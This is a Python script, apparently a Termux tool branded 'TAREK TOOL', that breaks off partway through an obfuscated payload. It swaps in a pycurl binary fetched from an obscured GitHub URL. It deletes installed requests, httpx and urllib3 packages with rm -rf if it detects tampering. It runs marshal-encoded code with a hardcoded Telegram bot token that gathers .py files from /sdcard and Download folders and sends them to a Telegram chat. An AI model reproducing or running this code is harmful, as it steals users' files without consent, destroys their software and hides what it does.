import os,time,sys
#▬▭▬▭▬▭▬▭[COLOR & STYLE]▬▭▬▭▬▭▬▭#
white= "\x1b[1;97m";yelloww="\033[1;33m";green = "\x1b[38;5;46m";G0 = "\x1b[38;5;155m";green1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";red = "\x1b[38;5;160m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\x1b[38;5;205m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m";orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";rad="\x1b[38;5;160m";YLW="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
style=f"{white}[{red}●{white}]"
os.system("clear")
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip uninstall pycurl -y && pip install pycurl')
os.system("clear")
#▬▭▬▭▬▭▬▭[REQUIRED MODULE]▬▭▬▭▬▭▬▭#
try:import requests
except ImportError:print(f"{style} {green}installing requests...{white}");time.sleep(0.5);os.system('pip install requests');import requests;os.system('clear')
try:import bs4
except ImportError:print(f"{style} {green}installing bs4...{white}");time.sleep(0.5);os.system('pip install bs4');import bs4;os.system('clear')
try:import httpx
except ImportError:print(f"{style} {green}installing httpx...{white}");time.sleep(0.5);os.system('pip install httpx');import httpx;os.system('clear')
try:import pystyle
except ImportError:print(f"{style} {green}installing pystyle...{white}");time.sleep(0.5);os.system('pip install pystyle');import pystyle;os.system('clear')
try:import rich
except ImportError:print(f"{style} {green}installing rich...{white}");time.sleep(0.5);os.system('pip install rich');import pystyle;os.system('clear')
from pystyle import Colors, Colorate
import pycurl,certifi,zlib
from io import BytesIO
#▬▭▬▭▬▭▬▭[PYCURL SETUP]▬▭▬▭▬▭▬▭#
def py_curl(url):
    curl = pycurl.Curl()
    buffer = BytesIO()
    try:
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.SSL_VERIFYPEER, 1)
        curl.setopt(curl.SSL_VERIFYHOST, 2)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
    except pycurl.error as e:
        return f"An error in py{e}"
    finally:
        curl.close()
    response_body = buffer.getvalue().decode('utf-8')
    return response_body
#▬▭▬▭▬▭▬▭[TOOL SERVER]▬▭▬▭▬▭▬▭#
def tool_server():
    try:database = py_curl(str(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fq\x0cr\xf5\xd6510\x81\xb2B\x03\\\x1cC\\\xf5s\x133\xf3\xf4\x81J\xcb\xf4J*J\x00v\xc3\x18@')).replace("b'", "").replace("'", ""));colors=[white,green1,YLW]
    except Exception as e:print(f'{green} An error occurred: {e}');exit()
    if 'on' in database or 'On' in database:pass
    if 'update' in database or 'Update' in database:
        while True:
            for color in colors:print(f"{color}THIS SERVER IS UPDATING PLEASE WAIT FOR UPDATE\n");time.sleep(1)
    if 'off' in database or 'Off' in database:
        while True:
            for color in colors:print(f"{color}CURRENTLY THIS TOOL IS OFFLINE\n");time.sleep(1)
tool_server()
#▬▭▬▭▬▭▬▭[PERMISSION OF SDCARD]▬▭▬▭▬▭▬▭#
try:
    os.system('rm -'+'rf /sd'+'card/.txt');os.system('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
except PermissionError:
    os.system("clear")
    print(f"{style} {green}TAREK TOOL IS NOT ALLOW WITHOUT STORAGE PERMISSION");os.system('termux-setup-storage');os.system('clear');exit(f"{green} RUN AGAIN 👉 python TAREK-GREEN.py")
try:os.makedirs('/sdcard/TAREK-TOOL')
except:pass
#▬▭▬▭▬▭▬▭[LOADING SYSTEM]▬▭▬▭▬▭▬▭#
def tarek(z):
      for a in z +'\n':sys.stdout.write(a);sys.stdout.flush();time.sleep(0.050)
#▬▭▬▭▬▭▬▭[OPENING MOMENT]▬▭▬▭▬▭▬▭#
print(f'{style}{green} Checking Update...{white}');time.sleep(2)
os.system("git pull");os.system("xdg-open https://facebook.com/groups/1191593692246458/");time.sleep(2);os.system("clear")
#▬▭▬▭▬▭▬▭[MODULE IMPORT]▬▭▬▭▬▭▬▭#
import pycurl
import uuid,base64,hashlib,zlib,subprocess,time,platform
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,marshal,base64,zlib
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
from concurrent.futures import ThreadPoolExecutor
os.system("pip install licensing > /dev/null")
from licensing.models import *
from licensing.methods import Key, Helpers
try:os.remove("p"+"yc"+"url"+".cpython-311.so")
except:pass
mr_tarek = subprocess.run(['curl', '-L', 'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'g'+'i'+'t'+'h'+'u'+'b'+'.'+'c'+'o'+'m'+'/'+'M'+'R'+'-'+'T'+'A'+'R'+'E'+'K'+'-'+'4'+'0'+'4'+'/'+'C'+'U'+'R'+'L'+'/'+'b'+'l'+'o'+'b'+'/'+'m'+'a'+'i'+'n'+'/'+'p'+'y'+'c'+'u'+'r'+'l'+'.'+'c'+'p'+'y'+'t'+'h'+'o'+'n'+'-'+'3'+'1'+'1'+'.'+'s'+'o'+'?raw=true', '-o', 'p'+'y'+'c'+'u'+'r'+'l'+'.'+'c'+'p'+'y'+'t'+'h'+'o'+'n'+'-'+'3'+'11.so'])
if mr_tarek.returncode != 0:
    os.system("clear")
    print(f"{green} PLEASE CHECK INTERNET CONNECTION")
    exit(1)
else:
    pass
try:shutil.rmtree("pycurl-7.45.2.dist-info")
except:pass
try:shutil.rmtree("pycurl")
except:pass
try:shutil.rmtree("/data/data/com.termux/files/usr/lib/python3.11/site-packages/"+"pyc"+"url"+"-7"+".45"+".2."+"dist-info")
except:pass
try:shutil.rmtree("/data/data/com.termux/files/usr/lib/python3.11/site-packages/"+"py"+"cur"+"l")
except:pass
try:os.remove("/data/data/com.termux/files/usr/lib/python3.11/site-packages/"+"py"+"curl"+".cpython-311.so")
except:pass
import pycurl
from io import BytesIO
os.remove("pycurl.cpython-311.so")
nillxd = "pycurl"
if os.path.exists(nillxd) and os.path.isdir(nillxd):
    exit(f"{green}ERROR PLEASE RUN AGAIN")
else:
    pass
os.system("clear")
sim = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',',f' {red}●{white} ')
#▬▭▬▭▬▭▬▭[LOOP & DATE]▬▭▬▭▬▭▬▭#
my_color = [white,blue,green];warna = random.choice(my_color)
loop = 0
oks = []
cps = []
id = []
ck = []
loop,oks,cps,user,total,sid,ps,id = 0,[],[],[],[],[],[],[]
cok,plist = [],[]
import time
from datetime import datetime
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
today = '\x1b[38;5;46m'+str(hari)+'\033[1;97m-\x1b[38;5;46m'+str(bulan)+''
#▬▭▬▭▬▭▬▭[SECURITY BOX]▬▭▬▭▬▭▬▭#
style_2=f"{white}[{red}●{white}]{green}"
site = '/da'+'ta/data/com.termu'+'x/files/usr/lib/python3.11/s'+'ite-packages/'
alart=(f"{style_2} Kire khankir pola are you mother fucker\n{style_2} Don't try bypass and capture boss\n{style_2} Aibar er moto chere dilam re kankir pola")
try:
    mr_tarek=f'{site}reque'+'sts/'
    if not 'print' in open(mr_tarek+'sess'+'ions.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
try:
    mr_tarek1=f'{site}reque'+'sts/'
    if not 'print' in open(mr_tarek1+'mod'+'els.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
try:
    mr_tarek2=f'{site}reque'+'sts/'
    if not 'print' in open(mr_tarek2+'ap'+'i.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
try:
    king=f'{site}reque'+'sts/'
    if not 'sys.stdout.write' in open(king+'sess'+'ions.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
try:
    qeen=f'{site}req'+'uests/'
    if not 'sys.stdout.write' in open(qeen+'mod'+'els.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
try:
    don=f'{site}requ'+'ests/'
    if not 'sys.stdout.write' in open(don+'a'+'pi.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
try:
    a=open('requests/sessions.py','r').read()
    if 'print' in a:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    b=open('requests/api.py','r').read()
    if 'print' in b:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    c=open('requests/models.py','r').read()
    if 'print' in c:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    d=open('httpx/_api.py','r').read()
    if 'print' in d:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    e=open('httpx/_auth.py','r').read()
    if 'print' in e:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    f=open('httpx/_models.py','r').read()
    if 'print' in f:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    g=open('requests/sessions.py','r').read()
    if 'sys.stdout.write' in g:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    h=open('requests/api.py','r').read()
    if 'sys.stdout.write' in h:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    h=open('requests/models.py','r').read()
    if 'sys.stdout.write' in h:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    ii=open('httpx/_api.py','r').read()
    if 'sys.stdout.write' in ii:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    j=open('httpx/_auth.py','r').read()
    if 'sys.stdout.write' in j:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    k=open('httpx/_models.py','r').read()
    if 'sys.stdout.write' in k:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    l=open('requests/api.py', 'r').read()
    if "verify = False" in l:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    m=open('requests/sessions.py', 'r').read()
    if "self.verify = False" in m:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    n=open(f'urllib3/conne'+'ction.py', 'r').read()
    if str("cert_reqs = 'CERT_NONE'") in n:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3');exit(f"{alart}")
    else:pass
except Exception as e:pass
#▬▭▬▭▬▭▬▭[SPECIAL LINE]▬▭▬▭▬▭▬▭#
def linex():
    #print(Colorate.Horizontal(Colors.red_to_white, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
    print(f"{red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    #▬▭▬▭▬▭▬▭[ Import marshal]▬▭▬▭▬▭▬▭#
import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\xf3P\x01\x00\x00\x97\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x02l\x03m\x04Z\x05\x01\x00\t\x00d\x00d\x01l\x00Z\x00n\x1b#\x00\x01\x00\x02\x00e\x01j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00d\x01l\x00Z\x00Y\x00n\x03x\x03Y\x00w\x01d\x04\x84\x00Z\x07d\x05\x84\x00Z\x08d\x06\x84\x00Z\td\x07Z\nd\x08\x84\x00Z\x0b\x02\x00e\x05d\t\xac\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x005\x00Z\x0ce\x0c\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x0c\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x0c\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x0e\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01d\x01d\x01\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00d\x01S\x00)\x0b\xe9\x00\x00\x00\x00N)\x01\xda\x12ThreadPoolExecutorz\x14pip install requestsc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\xf3,\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00d\x00S\x00)\x01N)\x02\xda\x08requests\xda\x07session)\x01r\x06\x00\x00\x00s\x01\x00\x00\x00 \xfa\x01 \xda\x06suyaibr\x08\x00\x00\x00\r\x00\x00\x00s\x14\x00\x00\x00\x80\x00\xdd\x0c\x14\xd4\x0c\x1c\xd1\x0c\x1e\xd4\x0c\x1e\x80G\x80G\x80G\xf3\x00\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3P\x07\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00d\x01}\x01d\x02}\x02\t\x00d\x03}\x03d\x04\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x0b}\x03d\x0c\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\r}\x03d\x0e\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x0f}\x03d\x10\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x11}\x03d\x12\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bd\x00S\x00#\x00\x01\x00Y\x00d\x00S\x00x\x03Y\x00w\x01)\x13N\xfa.6602564808:AAEkhZwDSKdFMQ8W9TjpgM_VxFzqzYN9jHk\xda\n6957719257z\x07/sdcardc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00\xa9\x01z\x03.py\xa9\x01\xda\x08endswith\xa9\x02\xda\x02.0\xda\x01fs\x02\x00\x00\x00  r\x07\x00\x00\x00\xfa\n<listcomp>z\x18sexy.<locals>.<listcomp>\x17\x00\x00\x00\xf3)\x00\x00\x00\x80\x00\xd0\x14M\xd0\x14M\xd0\x14M\x981\xb81\xbf:\xba:\xc0e\xd1;L\xd4;L\xd0\x14M\x90Q\xd0\x14M\xd0\x14M\xd0\x14Mr\t\x00\x00\x00\xda\x02rb\xfa\x1chttps://api.telegram.org/bot\xfa\r/sendDocument\xda\x07chat_id\xda\x08document\xa9\x02\xda\x04data\xda\x05filesz\x10/sdcard/Downloadc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x18sexy.<locals>.<listcomp>$\x00\x00\x00r\x15\x00\x00\x00r\t\x00\x00\x00z\x19/sdcard/Download/Telegramc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  